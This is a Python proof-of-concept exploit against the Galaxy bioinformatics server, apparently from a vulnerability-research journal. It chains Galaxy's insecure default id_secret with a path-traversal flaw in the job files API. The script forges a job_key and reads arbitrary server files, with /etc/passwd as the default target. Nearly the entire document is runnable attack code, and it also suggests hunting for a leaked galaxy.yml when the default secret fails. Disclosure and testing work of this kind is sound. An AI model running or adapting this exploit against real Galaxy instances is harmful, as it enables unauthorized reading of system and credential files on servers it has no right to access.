#!/usr/bin/env python
"""
HG-2026-001 — CWE-22 Path Traversal + CWE-1188 Insecure Default id_secret
Journal: journals/HG-2026-001-path-traversal-default-id-secret.md

Setup:
  1. git clone https://github.com/galaxyproject/galaxy && cd galaxy
  2. python -m venv venv && source venv/bin/activate
  3. pip install -r requirements.txt -r /path/to/hallownest-galaxy/requirements.txt
  4. Copy this script to scripts/ inside the Galaxy repo
  5. Fill in .env at the hallownest-galaxy root (GALAXY_URL, API_KEY, ID_SECRET, TARGET_FILE)
"""

import os
import sys
import time
import warnings

import requests
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(__file__), os.pardir, ".env"))

warnings.filterwarnings("ignore")
sys.path.insert(1, os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir, "lib")))
from galaxy.security.idencoding import IdEncodingHelper

GALAXY_URL       = os.getenv("GALAXY_URL",        "https://galaxy_domain")
API_KEY          = os.getenv("API_KEY",           "apikeyfromauthenticateduser")
TARGET_FILE      = os.getenv("TARGET_FILE",       "/etc/passwd")
SPELL_ID_SECRET  = os.getenv("SPELL_ID_SECRET",   "USING THE DEFAULT IS NOT SECURE!")

helper  = IdEncodingHelper(id_secret=SPELL_ID_SECRET)
headers = {"x-api-key": API_KEY}


def find_dataset_tool(history_id, max_tools=100):
    """Return (tool_id, input_name) for the first tool that accepts a dataset."""
    r = requests.get(
        f"{GALAXY_URL}/api/tools",
        headers=headers,
        params={"in_panel": False},
        verify=False,
    )
    r.raise_for_status()
    for tool in r.json()[:max_tools]:
        tid = tool.get("id", "")
        r2 = requests.get(
            f"{GALAXY_URL}/api/tools/{tid}/build",
            headers=headers,
            params={"history_id": history_id},
            verify=False,
        )
        if r2.status_code != 200:
            continue
        for inp in r2.json().get("inputs", []):
            if inp.get("type") == "data":
                return tid, inp["name"]
    raise RuntimeError("no tool with a dataset input found in first %d tools" % max_tools)


def wait_for_job(job_id, timeout=120):
    for _ in range(timeout):
        r = requests.get(f"{GALAXY_URL}/api/jobs/{job_id}", headers=headers, verify=False)
        if r.json().get("state") in ("ok", "error", "failed", "deleted"):
            return
        time.sleep(1)


# 1. Create history
print("[*] Creating history...")
r = requests.post(f"{GALAXY_URL}/api/histories", headers=headers, json={"name": "hg-poc"}, verify=False)
r.raise_for_status()
history_id = r.json()["id"]
print(f"[*] History: {history_id}")

# 2. Find a tool that takes a dataset as input
print("[*] Finding tool with dataset input...")
tool_id, input_name = find_dataset_tool(history_id)
print(f"[*] Tool: {tool_id}  input param: {input_name}")

# 3. Upload a random file
print("[*] Uploading dataset...")
r = requests.post(
    f"{GALAXY_URL}/api/tools",
    headers=headers,
    json={
        "tool_id": "upload1",
        "history_id": history_id,
        "inputs": {
            "files_0|url_paste": "hallownest",
            "files_0|type": "upload_dataset",
            "files_0|file_type": "txt",
        },
    },
    verify=False,
)
r.raise_for_status()
wait_for_job(r.json()["jobs"][0]["id"])

r = requests.get(f"{GALAXY_URL}/api/histories/{history_id}/contents", headers=headers, verify=False)
dataset_id = r.json()[-1]["id"]
print(f"[*] Dataset: {dataset_id}")

# 4. Run the found tool on the dataset — we only need the job id, not the result
print(f"[*] Running {tool_id}...")
r = requests.post(
    f"{GALAXY_URL}/api/tools",
    headers=headers,
    json={
        "tool_id": tool_id,
        "history_id": history_id,
        "inputs": {input_name: {"src": "hda", "id": dataset_id}},
    },
    verify=False,
)
r.raise_for_status()
job_enc_id = r.json()["jobs"][0]["id"]

import galaxy.exceptions
try:
    job_int_id = helper.decode_id(job_enc_id)
except galaxy.exceptions.MalformedId:
    print(f"[-] Could not decode job id with the provided SPELL_ID_SECRET.")
    print(f"[-] The instance is probably NOT using the default id_secret — that's good news for them.")
    print(f"[-] To exploit, find the actual id_secret (e.g. from a leaked galaxy.yml) and set SPELL_ID_SECRET accordingly.")
    sys.exit(1)
print(f"[*] Job enc: {job_enc_id}  int: {job_int_id}")

# 5. Forge job_key
job_key = helper.encode_id(job_int_id, kind="jobs_files")
print(f"[*] job_key: {job_key}")

# 6. Path traversal
print(f"\n[*] Reading {TARGET_FILE}...")
r = requests.get(
    f"{GALAXY_URL}/api/jobs/{job_enc_id}/files",
    params={"job_key": job_key, "path": TARGET_FILE},
    verify=False,
)
print(f"[*] Status: {r.status_code}")
print(f"\n{'='*50}")
print(r.text)
print("=" * 50)
